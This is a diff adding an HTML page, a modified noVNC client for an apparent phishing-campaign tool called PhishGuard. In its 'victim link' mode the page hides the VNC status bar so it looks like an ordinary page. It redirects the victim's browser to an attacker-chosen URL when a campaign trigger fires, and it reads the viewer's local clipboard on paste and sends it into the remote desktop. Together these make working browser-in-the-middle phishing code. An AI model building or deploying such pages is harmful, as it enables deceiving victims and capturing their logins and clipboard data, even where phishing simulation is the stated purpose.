@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!--
+    PhishGuard noVNC client — based on noVNC's vnc_lite.html (MPL 2.0 / BSD),
+    with two-way clipboard sync wired to the browser Clipboard API so Ctrl+C /
+    Ctrl+V work between the operator's laptop and the remote desktop.
+    -->
+    <title>noVNC</title>
+    <style>
+        html { height: 100%; }
+        body { margin: 0; background-color: dimgrey; height: 100%; display: flex; flex-direction: column; }
+        #top_bar { background-color: #6e84a3; color: white; font: bold 12px Helvetica; padding: 6px 5px 4px 5px; border-bottom: 1px outset; }
+        #status { text-align: center; }
+        #sendCtrlAltDelButton { position: fixed; top: 0px; right: 0px; border: 1px outset; padding: 5px 5px 4px 5px; cursor: pointer; }
+        #screen { flex: 1; overflow: hidden; }
+    </style>
+
+    <script type="module" crossorigin="anonymous">
+        import RFB from './core/rfb.js';
+
+        let rfb;
+        let desktopName;
+
+        function status(text) { document.getElementById('status').textContent = text; }
+        function connectedToServer() { status("Connected to " + desktopName); }
+        function disconnectedFromServer(e) {
+            status(e.detail.clean ? "Disconnected" : "Something went wrong, connection is closed");
+        }
+        function credentialsAreRequired() {
+            const password = prompt("Password Required:");
+            rfb.sendCredentials({ password: password });
+        }
+        function updateDesktopName(e) { desktopName = e.detail.name; }
+        function sendCtrlAltDel() { rfb.sendCtrlAltDel(); return false; }
+
+        function readQueryVariable(name, defaultValue) {
+            const re = new RegExp('.*[?&]' + name + '=([^&#]*)'),
+                  match = document.location.href.match(re);
+            return match ? decodeURIComponent(match[1]) : defaultValue;
+        }
+
+        document.getElementById('sendCtrlAltDelButton').onclick = sendCtrlAltDel;
+
+        const host = readQueryVariable('host', window.location.hostname);
+        let port = readQueryVariable('port', window.location.port);
+        const password = readQueryVariable('password');
+        const path = readQueryVariable('path', 'websockify');
+        // Only the deployed victim link enables trigger-redirect. The creation
+        // preview (and the dashboard embed) must never redirect.
+        const allowRedirect = readQueryVariable('redirect', '') === '1';
+
+        status("Connecting");
+
+        let url = (window.location.protocol === "https:") ? 'wss' : 'ws';
+        url += '://' + host;
+        if (port) { url += ':' + port; }
+        url += '/' + path;
+
+        rfb = new RFB(document.getElementById('screen'), url,
+                      { credentials: { password: password } });
+
+        rfb.addEventListener("connect", connectedToServer);
+        rfb.addEventListener("disconnect", disconnectedFromServer);
+        rfb.addEventListener("credentialsrequired", credentialsAreRequired);
+        rfb.addEventListener("desktopname", updateDesktopName);
+
+        rfb.viewOnly = readQueryVariable('view_only', false);
+        rfb.scaleViewport = readQueryVariable('scale', false);
+        // Victim link: hide the noVNC status bar so it looks like a normal page.
+        if (allowRedirect) {
+            const tb = document.getElementById('top_bar');
+            if (tb) tb.style.display = 'none';
+        }
+
+        // ─── Clipboard sync (laptop ⇄ remote desktop) ─────────────────────────
+        const REDIRECT_PREFIX = "PHISHGUARD_REDIRECT::";
+
+        // Remote → laptop: when the remote desktop's clipboard changes (e.g. the
+        // user copies text in the remote browser), write it to the laptop clipboard.
+        // A special PHISHGUARD_REDIRECT signal means the campaign trigger fired —
+        // navigate the viewer's OWN browser to the redirect target, leaving noVNC.
+        rfb.addEventListener("clipboard", (e) => {
+            const text = e.detail && e.detail.text;
+            if (typeof text !== "string" || !text.length) return;
+
+            if (text.indexOf(REDIRECT_PREFIX) === 0) {
+                if (allowRedirect) {
+                    const target = text.slice(REDIRECT_PREFIX.length).trim();
+                    if (target) {
+                        const top = window.top || window;
+                        try { top.location.href = target; } catch (_) { window.location.href = target; }
+                    }
+                }
+                return; // never mirror the signal to the laptop clipboard
+            }
+
+            try { navigator.clipboard.writeText(text).catch(() => {}); } catch (_) {}
+        });
+
+        // Primary redirect channel: poll the same-origin file the container's
+        // watcher writes when the campaign trigger fires. Reliable (no clipboard
+        // / x11vnc dependency). When it holds a URL, leave noVNC for it.
+        let redirected = false;
+        if (allowRedirect) setInterval(async () => {
+            if (redirected) return;
+            try {
+                const r = await fetch("pg-redirect.txt?t=" + Date.now(), { cache: "no-store" });
+                if (!r.ok) return;
+                const url = (await r.text()).trim();
+                if (/^https?:\/\//i.test(url)) {
+                    redirected = true;
+                    const top = window.top || window;
+                    try { top.location.href = url; } catch (_) { window.location.href = url; }
+                }
+            } catch (_) {}
+        }, 300);
+
+        // Send a real Ctrl+V keystroke to the remote so the focused app pastes.
+        function sendRemotePaste() {
+            rfb.sendKey(0xffe3, "ControlLeft", true);   // Ctrl down
+            rfb.sendKey(0x76, "KeyV", true);            // V down
+            rfb.sendKey(0x76, "KeyV", false);           // V up
+            rfb.sendKey(0xffe3, "ControlLeft", false);  // Ctrl up
+        }
+
+        // Laptop → remote: intercept Ctrl+V (capture phase, before noVNC forwards
+        // the keystroke), push the LAPTOP clipboard into the remote clipboard,
+        // then trigger the paste — so the remote pastes what you copied locally.
+        window.addEventListener("keydown", async (e) => {
+            const isPaste = (e.ctrlKey || e.metaKey) && !e.altKey &&
+                            (e.code === "KeyV" || e.key === "v" || e.key === "V");
+            if (!isPaste) return;
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            let text = "";
+            try { text = await navigator.clipboard.readText(); } catch (_) {}
+            if (text) {
+                rfb.clipboardPasteFrom(text);     // update the remote clipboard
+                setTimeout(sendRemotePaste, 60);  // let it arrive, then paste
+            } else {
+                sendRemotePaste();                // couldn't read — plain paste
+            }
+        }, true);
+    </script>
+</head>
+
+<body>
+    <div id="top_bar">
+        <div id="status">Loading</div>
+        <div id="sendCtrlAltDelButton">Send CtrlAltDel</div>
+    </div>
+    <div id="screen"></div>
+</body>
+</html>
